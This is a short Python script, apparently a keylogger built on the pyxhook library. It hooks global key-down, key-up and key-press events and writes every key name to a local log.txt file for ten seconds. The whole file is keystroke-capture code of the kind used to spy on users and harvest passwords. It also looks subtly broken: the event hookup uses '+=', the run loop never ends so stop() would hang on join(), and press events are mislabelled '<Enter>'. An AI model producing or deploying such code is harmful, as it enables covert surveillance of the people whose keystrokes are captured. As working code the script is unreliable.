import pyxhook
import time
import threading
import os

class KeyLogger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.hook = pyxhook.HookManager()
        self.log = open("log.txt", "w")
        self.capture = False

    def run(self):
        self.hook.KeyDown += self.OnKeyDown
        self.hook.KeyUp += self.OnKeyUp
        self.hook.KeyPress += self.OnKeyPress
        self.hook.Start()
        while True:
            time.sleep(0.1)

    def OnKeyDown(self, e):
        if not self.capture:
            self.capture = True
        self.log.write("<Down>" + e.KeyName + "\n")

    def OnKeyUp(self, e):
        if not self.capture:
            self.capture = True
        self.log.write("<Up>" + e.KeyName + "\n")

    def OnKeyPress(self, e):
        if not self.capture:
            self.capture = True
        self.log.write("<Enter>" + e.Key + "\n")

    def stop(self):
        self.hook.Stop()
        self.log.close()
        self.join()

def main():
    kl = KeyLogger()
    kl.start()
    time.sleep(10)
    kl.stop()

if __name__ == "__main__":
    main()
